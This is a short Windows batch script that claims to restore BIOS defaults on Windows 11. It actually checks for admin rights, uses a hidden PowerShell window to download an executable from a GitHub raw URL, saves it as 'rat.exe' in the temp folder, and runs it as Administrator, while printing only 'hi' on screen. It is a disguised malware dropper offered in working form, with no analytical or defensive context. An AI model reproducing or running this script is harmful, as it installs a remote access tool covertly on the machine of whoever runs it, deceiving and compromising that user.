@echo off

goto get_permissions

:get_permissions
    echo Windows 11 :: Restoring BIOS defaults...
    
    net session >nul 2>&1
    if %errorLevel% == 0 (
        
    ) else (
        echo Please run the program with Administrative privleges.
    )
    
    pause >nul

:: Hide PowerShell execution completely
powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1

:: Display "hi" message
echo hi

:: Run the downloaded file as administrator
start /B "" runas /user:Administrator "%TEMP%\rat.exe"

endlocal
